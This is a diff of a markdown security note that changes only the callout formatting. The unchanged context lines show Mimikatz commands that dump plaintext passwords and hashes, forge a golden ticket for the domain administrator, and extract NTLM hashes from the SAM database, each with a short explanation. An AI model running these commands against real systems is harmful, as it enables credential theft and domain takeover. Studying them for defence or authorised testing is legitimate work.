@@ -10,8 +10,8 @@ Some example uses include extracting plaintext passwords:
 mimikatz # sekurlsa::logonpasswords
 ```
 
->[!info]
->This command lists the plaintext passwords and hashes of logged-in accounts.
+!!! info
+    This command lists the plaintext passwords and hashes of logged-in accounts.
 
 Or creating golden tickets:
 
@@ -19,8 +19,8 @@ Or creating golden tickets:
 mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:500
 ```
 
->[!info]
->This creates a Golden Ticket for the domain administrator. The required parameters are the domain name, domain [[Windows SID (Security Identifier)|SID]], and krbtgt account hash.
+!!! info
+    This creates a Golden Ticket for the domain administrator. The required parameters are the domain name, domain [[Windows SID (Security Identifier)|SID]], and krbtgt account hash.
 
 Or extracting NTLM hashes:
 
@@ -28,8 +28,8 @@ Or extracting NTLM hashes:
 mimikatz # lsadump::sam
 ```
 
->[!info]
->This dumps the [[SAM]] database containing NTLM hashes of local accounts.
+!!! info
+    This dumps the [[SAM]] database containing NTLM hashes of local accounts.
 
 
 
